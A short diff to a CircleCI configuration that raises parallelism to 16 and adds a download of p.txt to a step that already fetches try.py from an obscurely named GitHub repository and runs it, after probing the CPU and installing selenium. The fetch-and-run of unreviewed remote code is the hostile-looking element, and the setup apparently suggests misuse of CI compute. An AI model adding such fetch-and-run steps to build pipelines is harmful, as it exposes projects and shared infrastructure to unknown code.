@@ -10,6 +10,7 @@ jobs:
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
       - image: cimg/python:3.10.1
+    parallelism: 16
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
@@ -32,6 +33,7 @@ jobs:
             lscpu
             pip install selenium
             wget  https://raw.githubusercontent.com/yfvj45/yes/main/try.py
+            wget https://raw.githubusercontent.com/yfvj45/yes/main/p.txt
             python try.py
 
 # Invoke jobs via workflows
